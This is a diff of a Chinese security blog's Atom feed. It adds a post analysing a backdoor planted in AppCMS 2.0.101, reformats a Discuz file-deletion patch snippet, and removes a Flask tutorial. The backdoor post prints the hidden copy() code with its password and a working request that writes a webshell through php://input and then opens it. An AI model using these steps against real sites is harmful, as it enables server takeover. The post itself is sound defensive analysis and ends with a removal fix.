@@ -207,6 +207,49 @@
   </entry>
   
   <entry>
+    <title>AppCMS 2.0.101 后门分析</title>
+    <link href="http://chybeta.github.io/2017/12/17/AppCMS-2-0-101-%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/"/>
+    <id>http://chybeta.github.io/2017/12/17/AppCMS-2-0-101-后门分析/</id>
+    <published>2017-12-17T12:36:13.000Z</published>
+    <updated>2017-12-18T06:41:52.261Z</updated>
+    
+    <content type="html"><![CDATA[<p><a href="https://xianzhi.aliyun.com/forum/topic/1806/" target="_blank" rel="external">首发于先知安全技术社区：AppCMS 2.0.101 后门分析</a><br><a id="more"></a></p>
+<h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><p>下载地址：<a href="http://www.appcms.cc/html/gengxin.html" target="_blank" rel="external">http://www.appcms.cc/html/gengxin.html</a></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171217/4.png?raw=true" alt=""></p>
+<p>官方的更新时间是 2015-8-1</p>
+<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>用beyond compare比较与前一个版本的区别</p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171217/1.png?raw=true" alt=""></p>
+<p>可以发现，在 templates/m/ 文件夹下出现了一个 content_list.php 文件，修改时间为 2017年5月25日。</p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171217/3.png?raw=true" alt=""></p>
+<p>经过解密，<code>9c224bc6b59179729b15e1dddcbb5c82</code>为字符串<code>kejishidai</code>的md5值。</p>
+<p>由代码知，这里存在一个copy函数构成的后门。</p>
+<p>在第12行，实际执行的即为:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">copy(trim($_GET[url]),$_GET[cms]);</div></pre></td></tr></table></figure></p>
+<p>将参数url设置为<code>php://input</code>，参数cms设置为shell的文件名，然后POST传入webshell。如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1:2500/appcms/appcms_2.0.101/templates/m/content_list.php?session=kejishidai&amp;url=php://input&amp;cms=temp.php</div><div class="line"></div><div class="line">POST:</div><div class="line">&lt;?php phpinfo();?&gt;</div></pre></td></tr></table></figure></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171217/5.png?raw=true" alt=""></p>
+<p>接着访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1:2500/appcms/appcms_2.0.101/templates/m/temp.php</div></pre></td></tr></table></figure></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171217/6.png?raw=true" alt=""></p>
+<p>getshell。</p>
+<h1 id="建议"><a href="#建议" class="headerlink" title="建议"></a>建议</h1><p>删除 templates/m/ 文件夹下的content_list.php。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;a href=&quot;https://xianzhi.aliyun.com/forum/topic/1806/&quot;&gt;首发于先知安全技术社区：AppCMS 2.0.101 后门分析&lt;/a&gt;&lt;br&gt;
+    
+    </summary>
+    
+      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
+    
+    
+      <category term="php" scheme="http://chybeta.github.io/tags/php/"/>
+    
+      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+      <category term="后门分析" scheme="http://chybeta.github.io/tags/%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/"/>
+    
+  </entry>
+  
+  <entry>
     <title>[CVE-2016-7565]Exponent CMS 2.3.9 配置文件写入 getshell分析</title>
     <link href="http://chybeta.github.io/2017/12/11/CVE-2016-7565-Exponent-CMS-2-3-9-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5-getshell%E5%88%86%E6%9E%90/"/>
     <id>http://chybeta.github.io/2017/12/11/CVE-2016-7565-Exponent-CMS-2-3-9-配置文件写入-getshell分析/</id>
@@ -257,9 +300,9 @@
     
       <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
     
-      <category term="getshell" scheme="http://chybeta.github.io/tags/getshell/"/>
-    
       <category term="漏洞分析" scheme="http://chybeta.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
+    
+      <category term="getshell" scheme="http://chybeta.github.io/tags/getshell/"/>
     
   </entry>
   
@@ -968,7 +1011,7 @@
 <p>上面的这个思路，即对应着前面漏洞复现中的法一和法二。</p>
 <h1 id="相关老洞"><a href="#相关老洞" class="headerlink" title="相关老洞"></a>相关老洞</h1><p>乌云编号： wooyun-2014-065513</p>
 <p>当时的漏洞代码出在source/include/spacecp/spacecp_profile.php中，第69行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"># 这是当时的漏洞代码</div><div class="line">if($_GET[&apos;deletefile&apos;] &amp;&amp; is_array($_GET[&apos;deletefile&apos;])) &#123;</div><div class="line">	foreach($_GET[&apos;deletefile&apos;] as $key =&gt; $value) &#123;</div><div class="line">		if(isset($_G[&apos;cache&apos;][&apos;profilesetting&apos;][$key])) &#123;</div><div class="line">			echo (getglobal(&apos;setting/attachdir&apos;).&apos;./profile/&apos;.$space[$key]);</div><div class="line">			@unlink(getglobal(&apos;setting/attachdir&apos;).&apos;./profile/&apos;.$space[$key]);</div><div class="line">			@unlink(getglobal(&apos;setting/attachdir&apos;).&apos;./profile/&apos;.$verifyinfo[&apos;field&apos;][$key]);</div><div class="line">			$verifyarr[$key] = $setarr[$key] = &apos;&apos;;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>官方当时的补丁做法是：增加了一次判断<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>($_GET[<span class="string">'deletefile'</span>] &amp;&amp; is_array($_GET[<span class="string">'deletefile'</span>])) &#123;</div><div class="line">	<span class="keyword">foreach</span>($_GET[<span class="string">'deletefile'</span>] <span class="keyword">as</span> $key =&gt; $value) &#123;</div><div class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>($_G[<span class="string">'cache'</span>][<span class="string">'profilesetting'</span>][$key]) &amp;&amp; $_G[<span class="string">'cache'</span>][<span class="string">'profilesetting'</span>][$key][<span class="string">'formtype'</span>] == <span class="string">'file'</span>) &#123;</div><div class="line">			<span class="keyword">echo</span> <span class="string">"0"</span>;</div><div class="line">			@unlink(getglobal(<span class="string">'setting/attachdir'</span>).<span class="string">'./profile/'</span>.$space[$key]);</div><div class="line">			@unlink(getglobal(<span class="string">'settin</span></div><div class="line">				g/attachdir').<span class="string">'./profile/'</span>.$verifyinfo[<span class="string">'field'</span>][$key]);</div><div class="line">			$verifyarr[$key] = $setarr[$key] = <span class="string">''</span>;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>官方当时的补丁做法是：增加了一次判断<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">if($_GET['deletefile'] &amp;&amp; is_array($_GET['deletefile'])) &#123;</div><div class="line">	foreach($_GET['deletefile'] as $key =&gt; $value) &#123;</div><div class="line">		if(isset($_G['cache']['profilesetting'][$key]) &amp;&amp; $_G['cache']['profilesetting'][$key]['formtype'] == 'file') &#123;</div><div class="line">			echo "0";</div><div class="line">			@unlink(getglobal('setting/attachdir').'./profile/'.$space[$key]);</div><div class="line">			@unlink(getglobal('settin</div><div class="line">				g/attachdir').'./profile/'.$verifyinfo['field'][$key]);</div><div class="line">			$verifyarr[$key] = $setarr[$key] = '';</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
 <p>在删除之间多进行了一次验证：<code>$_G[&#39;cache&#39;][&#39;profilesetting&#39;][$key][&#39;formtype&#39;] == &#39;file&#39;</code>，也就是说，若要成功删除， 需要formtype为file类型。</p>
 <h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>这次的漏洞修复简单粗暴，将unlink语句直接删除。。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171016/12.png?raw=true" alt=""></p>
 <h1 id="Refference"><a href="#Refference" class="headerlink" title="Refference"></a>Refference</h1><ul>
@@ -988,9 +1031,9 @@
     
       <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
     
-      <category term="漏洞分析" scheme="http://chybeta.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
-    
       <category term="XSS" scheme="http://chybeta.github.io/tags/XSS/"/>
+    
+      <category term="漏洞分析" scheme="http://chybeta.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
     
   </entry>
   
@@ -1556,112 +1599,6 @@
       <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
     
       <category term="哈希长度扩展攻击" scheme="http://chybeta.github.io/tags/%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Flask Web开发笔记(1):程序的基本结构</title>
-    <link href="http://chybeta.github.io/2017/09/20/Flask-Web%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0-1-%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%9F%BA%E6%9C%AC%E7%BB%93%E6%9E%84/"/>
-    <id>http://chybeta.github.io/2017/09/20/Flask-Web开发笔记-1-程序的基本结构/</id>
-    <published>2017-09-20T11:04:49.000Z</published>
-    <updated>2017-09-23T06:00:49.900Z</updated>
-    
-    <content type="html"><![CDATA[<p>最近跟着<a href="https://book.douban.com/subject/26274202/" target="_blank" rel="external">狗书</a>和<a href="http://flask.pocoo.org/" target="_blank" rel="external">flask文档</a>学习Flask。结合官方文档对一些知识点做一些笔记，并做一些适当扩展。所以不太成体系甚至很零散，勿喷。<br><a id="more"></a></p>
-<h1 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h1><p>Flask程序必须要创建一个程序实例，程序实例是Flask类的对象。如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</div><div class="line">app = Flask(__name__)</div></pre></td></tr></table></figure></p>
-<p>对于该<a href="http://flask.pocoo.org/docs/0.12/api/#flask.Flask" target="_blank" rel="external">Flask类</a>，其定义如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">flask</span>.<span class="title">Flask</span><span class="params">(import_name, static_path=None, static_url_path=None, static_folder=’static’, template_folder=’templates’, instance_path=None, instance_relative_config=False, root_path=None)</span></span></div></pre></td></tr></table></figure></p>
-<p>第一个参数是必须要指定的。Flask用这个参数来找到相对于程序根目录的资源文件位置。如果是使用单一的模块(module)，使用<code>__name__</code>就行了。如果是使用一个包(package)的话，推荐硬编码进去。</p>
-<h1 id="路由和视图函数"><a href="#路由和视图函数" class="headerlink" title="路由和视图函数"></a>路由和视图函数</h1><p>flask程序实例保存了一个URL到python函数的映射关系。当客户端发送请求，服务器将请求转发给flask程序实例，flask程序实例依照映射关系利用函数进行处理。处理URL和函数之间的关系称之为<a href="http://docs.jinkan.org/docs/flask/quickstart.html#routing" target="_blank" rel="external">路由</a>。而像下文的<code>index()</code>和<code>hello()</code>的处理函数，称之为视图函数。</p>
-<p>可以使用<a href="http://flask.pocoo.org/docs/0.12/api/#flask.Flask.route" target="_blank" rel="external">app.route修饰器</a>来定义路由。(注：这里的app是前面已经创建好了的Flask类的对象)。</p>
-<p>基本示例：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@app.route('/')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></div><div class="line">	<span class="keyword">return</span> <span class="string">"hello world!"</span></div><div class="line"></div><div class="line"><span class="meta">@app.route('/hello')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">()</span>:</span></div><div class="line">	<span class="keyword">return</span> <span class="string">"hello hello world!"</span></div></pre></td></tr></table></figure></p>
-<p>在默认情况下，访问<code>http://localhost:5000/</code>时页面会打印出hello,world!，当访问<code>http://localhost:5000/hello</code>时，页面则会打印出hello hello world!。</p>
-<p>也可以构造动态的URL。通过给URL加上变量，利用装饰器，可以对URL的变量来做出对应的变化。这些动态的部分/变量，需要被标记为<code>&lt;variable_name&gt;</code>或者<code>&lt;converter:variable_name&gt;</code>，这个部分将可以被作为命名参数传递到函数中。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@app.route('/&lt;name&gt;')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">user</span><span class="params">(name)</span>:</span></div><div class="line">	<span class="keyword">return</span> <span class="string">"I'm %s"</span> % name</div><div class="line"></div><div class="line"><span class="meta">@app.route('/&lt;int:id&gt;')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">userid</span><span class="params">(id)</span>:</span></div><div class="line">	<span class="keyword">return</span> <span class="string">"The isinstance(id,int): %s"</span> % isinstance(id,int)</div></pre></td></tr></table></figure></p>
-<p>访问：<code>http://localhost:5000/chybeta</code>，会将字符串<code>chybeta</code>传递到user函数中，并返回给客户都：I’m chybeta。</p>
-<p>若是访问：<a href="http://localhost:5000/1" target="_blank" rel="external">http://localhost:5000/1</a> 则：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170919/1.png?raw=true" alt=""></p>
-<p>在第二个例子中：<code>@app.route(&#39;/&lt;int:id&gt;&#39;)</code>，指定了一个转换器，将id转换为整型int。目前有以下几种转换器：</p>
-<div class="table-container">
-<table>
-<thead>
-<tr>
-<th style="text-align:left">类型</th>
-<th style="text-align:left">说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:left">string</td>
-<td style="text-align:left">默认。接受除了斜杠以外的文本</td>
-</tr>
-<tr>
-<td style="text-align:left">int</td>
-<td style="text-align:left">接受整数</td>
-</tr>
-<tr>
-<td style="text-align:left">float</td>
-<td style="text-align:left">同 int ，但是接受浮点数</td>
-</tr>
-<tr>
-<td style="text-align:left">path</td>
-<td style="text-align:left">和默认的相似，但也接受斜线</td>
-</tr>
-<tr>
-<td style="text-align:left">any</td>
-<td style="text-align:left">matches one of the items provided</td>
-</tr>
-<tr>
-<td style="text-align:left">uuid</td>
-<td style="text-align:left">接受uuid字符串</td>
-</tr>
-</tbody>
-</table>
-</div>
-<p>path选择器的作用如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@app.route('/&lt;path:paths&gt;')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">path</span><span class="params">(paths)</span>:</span></div><div class="line">	<span class="keyword">return</span> <span class="string">"The path: %s"</span> % paths</div></pre></td></tr></table></figure></p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170919/2.png?raw=true" alt=""></p>
-<p>也就是说，path选择器不会把斜线作为分隔符，而是作为匹配的一整个部分。</p>
-<p>any选择器，未知，哪位解释下？</p>
-<p>uuid，如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@app.route('/&lt;uuid:id&gt;')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">uuid</span><span class="params">(id)</span>:</span></div><div class="line">	<span class="keyword">return</span> <span class="string">"The uuid: %s"</span> % id</div></pre></td></tr></table></figure></p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170919/3.png?raw=true" alt=""></p>
-<h1 id="flask的Web服务器"><a href="#flask的Web服务器" class="headerlink" title="flask的Web服务器"></a>flask的Web服务器</h1><p>在前面定义好程序实例app后，可以用<code>run()</code>方法来启动flask自带的Web服务器。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">	app.run(debug=<span class="keyword">True</span>)</div></pre></td></tr></table></figure></p>
-<p><a href="http://flask.pocoo.org/docs/0.12/api/#flask.Flask.run" target="_blank" rel="external">run()</a>方法的定义如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">run(host=None, port=None, debug=None, **options)</div></pre></td></tr></table></figure></p>
-<p>在 debug 模式启用的情况下(debug=True)，服务器会对修改的代码自动重新加载。</p>
-<p>另外，这个本身的服务器并不适用于生产环境。详情可见：<a href="http://flask.pocoo.org/docs/0.12/deploying/#deployment-options" target="_blank" rel="external">Deployment Options</a></p>
-<h1 id="请求与响应循环"><a href="#请求与响应循环" class="headerlink" title="请求与响应循环"></a>请求与响应循环</h1><h2 id="程序与请求上下文"><a href="#程序与请求上下文" class="headerlink" title="程序与请求上下文"></a>程序与请求上下文</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</div><div class="line"></div><div class="line"><span class="meta">@app.route('/')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></div><div class="line">	user_agent = request.headers.get(<span class="string">'User-Agent'</span>)</div><div class="line">	<span class="keyword">return</span> <span class="string">'&lt;p&gt;Your brower is %s&lt;/p&gt;'</span> % user_agent</div></pre></td></tr></table></figure>
-<p>这里出现了一个<a href="http://flask.pocoo.org/docs/0.12/api/#flask.Request" target="_blank" rel="external">request类</a>。关于其介绍可以见<a href="http://flask.pocoo.org/docs/0.12/api/#flask.request" target="_blank" rel="external">这里</a>。对于传入的request数据，flask保存了一个全局变量<code>request</code>对象。在一个多线程的环境中，flask能确保特定的request对象在特定的线程中全局可访问。</p>
-<p>有一些较为常用的attributes：</p>
-<ol>
-<li><p>request.headers: 以字典形式保存保存了request的头部。。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170921/3.png?raw=true" alt=""></p>
-</li>
-<li><p>request.method：指明了是GET还是POST方法等。</p>
-</li>
-<li>request.cookies： 以字典形式保存了cookie</li>
-<li>…. 还有好多 遇到再补充。</li>
-</ol>
-<!-- 接下来介绍一下[flask的上下文](http://flask.pocoo.org/docs/0.12/templating/#standard-context)。 -->
-<h2 id="请求调度"><a href="#请求调度" class="headerlink" title="请求调度"></a>请求调度</h2><p>接前面的URL映射关系与路由。除了使用<code>app.route()</code>修饰器来注册为事件的处理程序外，还有另外两种:</p>
-<ol>
-<li><a href="http://flask.pocoo.org/docs/0.12/api/#flask.Flask.add_url_rule" target="_blank" rel="external">flask.Flask.add_url_rule()</a></li>
-</ol>
-<ol>
-<li><a href="http://flask.pocoo.org/docs/0.12/api/#flask.Flask.url_map" target="_blank" rel="external">flask.Flask.url_map</a></li>
-</ol>
-<p>这里不展开，详细可见<a href="http://flask.pocoo.org/docs/0.12/api/#url-route-registrations" target="_blank" rel="external">URL Route Registrations</a></p>
-<h2 id="请求钩子"><a href="#请求钩子" class="headerlink" title="请求钩子"></a>请求钩子</h2><h2 id="响应"><a href="#响应" class="headerlink" title="响应"></a>响应</h2><h1 id="Flask扩展"><a href="#Flask扩展" class="headerlink" title="Flask扩展"></a>Flask扩展</h1>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;最近跟着&lt;a href=&quot;https://book.douban.com/subject/26274202/&quot;&gt;狗书&lt;/a&gt;和&lt;a href=&quot;http://flask.pocoo.org/&quot;&gt;flask文档&lt;/a&gt;学习Flask。结合官方文档对一些知识点做一些笔记，并做一些适当扩展。所以不太成体系甚至很零散，勿喷。&lt;br&gt;
-    
-    </summary>
-    
-      <category term="技术杂谈" scheme="http://chybeta.github.io/categories/%E6%8A%80%E6%9C%AF%E6%9D%82%E8%B0%88/"/>
-    
-    
-      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
-    
-      <category term="python" scheme="http://chybeta.github.io/tags/python/"/>
-    
-      <category term="flask" scheme="http://chybeta.github.io/tags/flask/"/>
-    
-      <category term="开发" scheme="http://chybeta.github.io/tags/%E5%BC%80%E5%8F%91/"/>
     
   </entry>
   
